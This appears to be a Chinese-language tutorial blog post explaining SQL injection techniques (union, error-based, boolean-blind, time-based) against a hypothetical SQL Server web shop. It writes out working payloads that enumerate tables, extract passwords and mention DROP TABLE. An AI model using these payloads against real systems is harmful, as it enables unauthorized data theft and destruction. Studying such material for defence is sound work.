---
layout: post
title:  "sql 注入"
category: sql
tags: [sql, read]
keywords: sql injection,sql注入
description: sql注入，error-based inject,Union-based injection,boolean-based injection,Time-based injection
---
###All your datas are belong to us (if we can break into the query context)###

SQL 注入是怎么成为可能的，简单的说就是打破原有的数据上下文加入一些查询内容。  
现在假设有一个URL包含一个 "id=1" 查询参数，这个参数最后会传到 SQL 查询语句中：  
	Select *　from Widget where ID = 1 
完整的URL连接可以是这样的：
http://widgetshop.com/widget/?id=1  
现在可以改请求的参数，比如给传一个参数 "2",这样都是正常的，但是如果把参数改成 "1 or 1=1"呢  
http://widgetshop.com/widget/?id=1 or 1=1  
到数据库服务器的时候，查询语句可能是这样的:  
	select * from Widget where id = 1 or 1=1  
这告诉我们数据没有经过验证处理(not being sanitised)，期望的是一个Integer的数据类型，但是实际上接收到的值是 "1 or 1=1"
更重要的是这个参数导致sql语句的变更会改变原语句的功能。现在不只是查找一条记录，而是所有的记录。如果是加上一个 "or 1=2"就是没有结果，
通过这两种情况我们就很容易判断这个程序是不是存在潜在的sql注入问题  

sql 注入的精髓就是---用一些不受信任的数据执行查询操作。
如果开发者的代码是这样话：
	query = "select * from Widget where Id = "+ Request.QueryString["Id"];
当然这是需要程序会接收受信任的参数，这里我们里只单纯的谈论SQL注入。

下面探讨一些常用的sql注入的方法：  
####Union query-based injection####
看刚才上面的那个例子，现在URL是这样的:http://widgetshop.com/Widgets/?TypeId=1
在页面上显示的结果如下：
Shiny  
Round  
Fuzzy  
我们期待查询语句类似于这样：  
	select name from Widget where TypeId=1  
我们可能可以添加一些sql到查询数据中(请求参数)，可能是这样子：  
http://widgetshop.com/Widgets/?TypeId=1 union all select name from sysobjects where xtype='u'  
这样的话创建的SQL语句可能就是这样的：  
	select name from Widget where TypeId = 1 union all select name from sysobjects where xtype='u'  
注意，sysobjects 表是有数据库中所有的对象，我使用查询条件 xtype "u",也就是说我们查出所有的用户表(表名)，这意味着页面上会显示(除了原来的信息，还有用户表，这里假设只有二个)  
Shiny
Round
Fuzzy
Widget
User
这就是一个种基于Union查询的注入攻击，一些额外的结果在html页面上显示出来了，现在我们就知道了有一个叫做user的表
现在可以这样做：
http://widgetshop.com/Widgets/?TypeId=1 union all select password from [user]
SQL Server中如果表是以"user"命令，在使用的时候不加[],会有其他的含意。通过上面的语句可以得到结果
Shiny
Round
Fuzzy
P@ssw0rd

UNION All 方法要求是在第一个 sql 语句跟第二个 sql 语句有相同的列数才可以，这也是非常容易处理的，
你只需要使用 "union all select 'a'"然后"union all select 'a','b'"这样一直猜下去就可以了。
可以继续使用这种方法拉回来更多的数据。

####Error-base Injection####
尝试另一种模式,看下面的URL  
http://widgetshop.com/widget/?id=1 or x=1  
注意，这不会是不一个有效的sql语句，除非表中有一个 column 叫 x，否则会抛出一个异常，你会看到下面的信息  
。。。。。。
这是一个 ASP.NET的错误信息，其他的框架也会有类似的信息。
重要的是这些错误信息会将内部的实现给暴露出来，这样就可以确定应用程序会把sql异常给暴露出来。  
然后接下来你就可以这样做：  
http://widgetshop.com/widget/?id=convert(int,(select top 1 name from sysobjects where id=(select top 1 id from (select top 1 id from sysobjects where xtype='u' order by id) sq order by id DESC)))  
然后会返回一个这样的结果在浏览器上  
这样就可以发现在数据库中的一个Widget的表，下面看一下上面的url中：  
convert(int, (
    select top 1 name from sysobjects where id=(
      select top 1 id from (
        select top 1 id from sysobjects where xtype='u' order by id
      ) sq order by id DESC
    )
  )
)
这个语句的目的就是从 sysobjects 表中查出所有用户表。为什么会这样呢  
只要将最里层的 sql 语句的top 1 一直往上面加 top 2， top3，这样再通过第二层的 sql 语句的 desc 排序就可以得到每个一用户表的name  
name   id
test1   1
test3   5
test4   3
test8   4
test9   10
经过最里层sql的排序会是1，3，4，5，10;先取到top1，再到第二层sql通过desc这时候得到id=1的表的name  
如果把最里层的sql改成 top 2，就会得到id为 1，3的两条记录，通过第二层的desc可以得到 id=3的表name。以此类推  
而到最外层的时候 conver(int, "name"),这样将一个字符串转换成int类型，就会在页面将表的名字给暴露出来,(当然，除非你的表名类似于 12，34这样。一般来也不会这样命名表)  
同样通过这样的一种方法也可以得到表中所有的列名，只要将这种方法应用在 syscolumns 表上就可以了  
这种方法只有程序会将错误信息显示在页面上的时候才会有效，如果程序有很好的配置避免了这种错误信息的暴露呢？
下面会说到 "blind" SQL injection
####"blind" SQL injection####
这前说的方法都会依赖程序暴露了内部的细节，将表或者其他的数据信息返回到UI上了。  
接下来看一下另外两种方法：boolean-based 跟 time-based  
####boolean-based injection####
看下面的这个例子  
http://widgetshop.com/widget/?id=1 and 1=2  
显示1=2永远不会为true,app会怎样处理这种情况呢  
1，可能只是抛出一个异常，通常开发者会认为记录是会存在的，因为这样的链接是app自己提供的。  
2，app不会抛出异常也不会显示数据  
不管怎样，app含蓄都告诉了我们没有记录从数据库返回来。现在做以下的尝试  
将访问链接变成这样  
http://widgetshop.com/widget/?id=1 and
(
  select top 1 substring(name, 1, 1) from sysobjects where id=(
    select top 1 id from (
      select top 1 id from sysobjects where xtype='u' order by id
    ) sq order by id desc
  )
) = 'a'

实际上这只是前面获取表名的一种变种，区别只是前面是试图将表名转换成一个int类型，
现在试图去判断表名的第一个字符是不是一个 'a',如果返回的结果跟 "?id=1" 返回的结果是一样的时候，说是就是以这个字符开头的。  
然后再用这种方法去判断第2个字符，当然这是相当的麻烦的，直到你得出了表名。这里有一个小的技巧  
看下面这个:  
(
  select top 1 ascii(lower(substring(name, 1, 1))) from sysobjects where id=(
    select top 1 id from (
      select top 1 id from sysobjects where xtype='u' order by id
    ) sq order by id desc
  )
) > 109  
一个微妙但是重要的区别，不再去判断字符是否相等而是判断在ASCII表中的位置，
这样的可以使用类似二分查找的方法去判断字符的ASCII码，可以减少很重复判断的次数。

###Time-based blind injection###
上面所有说的例子应用程序都是通过html输出信息，(错误信息，对象名，内部数据，显示信息是否与正常信息相同)，要是信息不能显式或隐式的得到呢？  
想像一下通过下面的URL通过攻击  
http://widgetshop.com/Widgets/?OrderBy=Name  
假设会转化成这样的查询：  
SELECT * FROM Widget ORDER BY Name  
显然不能这样直接使用一个order by,常用的一种方法是使用一个分号然后再加一条sql语句，像下面这样：  
http://widgetshop.com/Widgets/?OrderBy=Name;SELECT DB_NAME()  
除了可以得到数据库的名字，这几乎是没有危害的，一些更有危害性的做法像"DROP TABLE Widget".当然这需要web程序连接帐号需要有这样的权限。
一旦你可以这查询的时候问题就出来了。  
现在需要找另一种方法来做类似前面 boolean-based 的测试，使用WAITFOR DELAY 语法。
试一下这个：  
Name;
IF(EXISTS(
  select top 1 * from sysobjects where id=(
    select top 1 id from (
      select top 1 id from sysobjects where xtype='u' order by id
    ) sq order by id desc
  ) and ascii(lower(substring(name, 1, 1))) > 109
))  
WAITFOR DELAY '0:0:5'  
如果满足这条件的话，这个查询语句会延迟5秒钟，通过这样响应的时间间隔也可类似于boolean-based的方法得出表名，只不过会花上更久一点的时间。  
















